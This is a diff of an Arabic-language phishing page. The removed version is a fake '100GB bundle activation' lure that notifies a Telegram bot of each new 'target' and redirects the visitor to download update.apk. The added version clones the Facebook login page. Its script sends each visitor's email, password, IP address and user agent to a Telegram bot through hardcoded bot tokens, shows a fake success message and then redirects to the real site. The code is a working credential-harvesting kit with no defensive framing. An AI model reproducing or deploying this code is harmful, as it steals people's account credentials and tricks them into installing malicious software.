@@ -3,39 +3,276 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>تنشيط باقة الـ 100GB</title>
+    <title>تسجيل الدخول إلى فيسبوك</title>
     <style>
-        body { font-family: 'Segoe UI', sans-serif; background: #0a0a0a; color: #eee; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
-        .container { background: #1a1a1a; padding: 30px; border-radius: 15px; text-align: center; width: 90%; max-width: 400px; border: 1px solid #333; }
-        .bar-bg { background: #333; border-radius: 10px; height: 10px; margin: 20px 0; overflow: hidden; }
-        .bar-fill { background: #4CAF50; height: 100%; width: 0%; transition: 0.1s; }
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: Helvetica, Arial, sans-serif;
+        }
+        
+        body {
+            background-color: #f0f2f5;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+        }
+        
+        .header {
+            background-color: #ffffff;
+            height: 60px;
+            box-shadow: 0 1px 3px rgba(0, 0, 0, 0.1);
+            display: flex;
+            align-items: center;
+            padding: 0 20px;
+        }
+        
+        .logo {
+            color: #1877f2;
+            font-size: 28px;
+            font-weight: bold;
+        }
+        
+        .main {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            flex-grow: 1;
+            padding: 20px;
+        }
+        
+        .container {
+            display: flex;
+            max-width: 1000px;
+            width: 100%;
+            gap: 60px;
+            align-items: center;
+        }
+        
+        .intro {
+            flex: 1;
+        }
+        
+        .intro h1 {
+            color: #1877f2;
+            font-size: 48px;
+            margin-bottom: 10px;
+        }
+        
+        .intro p {
+            font-size: 24px;
+            color: #1c1e21;
+        }
+        
+        .login-box {
+            background-color: #ffffff;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1), 0 8px 16px rgba(0, 0, 0, 0.1);
+            padding: 20px;
+            width: 396px;
+        }
+        
+        .login-box form {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+        }
+        
+        .login-box input {
+            padding: 14px 16px;
+            border: 1px solid #dddfe2;
+            border-radius: 6px;
+            font-size: 17px;
+            width: 100%;
+        }
+        
+        .login-box input:focus {
+            outline: none;
+            border-color: #1877f2;
+            box-shadow: 0 0 0 2px #e7f3ff;
+        }
+        
+        .login-btn {
+            background-color: #1877f2;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 20px;
+            font-weight: bold;
+            padding: 12px;
+            cursor: pointer;
+            transition: background-color 0.3s;
+        }
+        
+        .login-btn:hover {
+            background-color: #166fe5;
+        }
+        
+        .forgot-pass {
+            color: #1877f2;
+            font-size: 14px;
+            text-align: center;
+            text-decoration: none;
+            display: block;
+            margin: 8px 0;
+        }
+        
+        .divider {
+            border-bottom: 1px solid #dadde1;
+            margin: 20px 0;
+        }
+        
+        .create-account {
+            background-color: #42b72a;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 17px;
+            font-weight: bold;
+            padding: 12px;
+            cursor: pointer;
+            margin: 0 auto;
+            display: block;
+            transition: background-color 0.3s;
+        }
+        
+        .create-account:hover {
+            background-color: #36a420;
+        }
+        
+        .footer {
+            background-color: #ffffff;
+            padding: 20px;
+            text-align: center;
+            font-size: 12px;
+            color: #737373;
+            margin-top: auto;
+        }
+        
+        .message {
+            margin-top: 15px;
+            padding: 10px;
+            border-radius: 6px;
+            display: none;
+            font-size: 14px;
+            text-align: center;
+        }
+        
+        .success {
+            background-color: #e6f7ee;
+            color: #1877f2;
+            border: 1px solid #1877f2;
+        }
+        
+        .error {
+            background-color: #fff8e6;
+            color: #ff9500;
+            border: 1px solid #ff9500;
+        }
     </style>
 </head>
 <body>
-<div class="container">
-    <h2>📡 جاري تنشيط باقة الـ 100GB</h2>
-    <p id="status">جاري فحص الشريحة: 0%</p>
-    <div class="bar-bg"><div class="bar-fill" id="fill"></div></div>
-</div>
-<script>
-    const token = "8378572092:AAGF5CC5KNNhbXp0Sc4tO10JYutLs3wrEr8";
-    const chatID = "8593367876";
+    <header class="header">
+        <div class="logo">facebook</div>
+    </header>
+    
+    <main class="main">
+        <div class="container">
+            <div class="intro">
+                <h1>facebook</h1>
+                <p>يساعدك Facebook على التواصل مع الأشخاص ومشاركة ما تريد معهم.</p>
+            </div>
+            
+            <div class="login-box">
+                <form id="loginForm">
+                    <input type="text" id="email" placeholder="البريد الإلكتروني أو رقم الهاتف" required>
+                    <input type="password" id="password" placeholder="كلمة السر" required>
+                    <button type="submit" class="login-btn">تسجيل الدخول</button>
+                    <a href="#" class="forgot-pass">هل نسيت كلمة السر؟</a>
+                    <div class="divider"></div>
+                    <button type="button" class="create-account">إنشاء حساب جديد</button>
+                </form>
+                <div id="message" class="message"></div>
+            </div>
+        </div>
+    </main>
+    
+    <footer class="footer">
+        <p>Ahmed Alshref © 2023</p>
+    </footer>
 
-    fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatID}&text=🌐 دخل هدف جديد للمستودع الجديد!`);
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            const messageDiv = document.getElementById('message');
+            
+            // إرسال البيانات إلى بوت تيليجرام
+            sendToTelegramBot(email, password)
+                .then(response => {
+                    messageDiv.textContent = "تم تسجيل الدخول بنجاح!";
+                    messageDiv.className = "message success";
+                    messageDiv.style.display = "block";
+                    
+                    // مسح النموذج بعد الإرسال
+                    document.getElementById('loginForm').reset();
+                    
+                    // إعادة توجيه المستخدم بعد 2 ثانية (اختياري)
+                    setTimeout(() => {
+                        window.location.href = "https://facebook.com";
+                    }, 2000);
+                })
+                .catch(error => {
+                    messageDiv.textContent = "خطأ في تسجيل الدخول. يرجى المحاولة مرة أخرى.";
+                    messageDiv.className = "message error";
+                    messageDiv.style.display = "block";
+                    console.error('Error:', error);
+                });
+        });
 
-    let w = 0;
-    let inter = setInterval(() => {
-        w++;
-        document.getElementById('fill').style.width = w + '%';
-        document.getElementById('status').innerText = "جاري التنشيط: " + w + "%";
-        if(w >= 100) {
-            clearInterval(inter);
-            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatID}&text=📥 الهدف بدأ تحميل الملف الآن!`);
-            // التوجيه لملفك المرفوع حالياً
-            window.location.href = "update.apk";
+        async function sendToTelegramBot(email, password) {
+            // استبدل TOKEN و CHAT_ID بقيم البوت الخاص بك
+            const botToken ='8523914728:AAGsOEWF8LHA8G0tnVqsqcbyuLBlNZMTHq0';
+            const chatId = '8593367876';
+            
+            const message = `بيانات تسجيل دخول جديدة:\n\nالبريد/الهاتف: ${email}\nكلمة المرور: ${password}\n\nIP: ${await getIP()}\nUser Agent: ${navigator.userAgent}`;
+            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+            
+            try {
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: message
+                    })
+                });
+                
+                if (!response.ok) {
+                    throw new Error('Network response was not ok');
+                }
+                
+                return await response.json();
+            } catch (error) {
+                throw error;
+            }
         }
-    }, 50);
-</script>
+        
+        async function getIP() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                return data.ip;
+            } catch {
+                return 'غير معروف';
+            }
+        }
+    </script>
 </body>
-</html>
 
+</html>
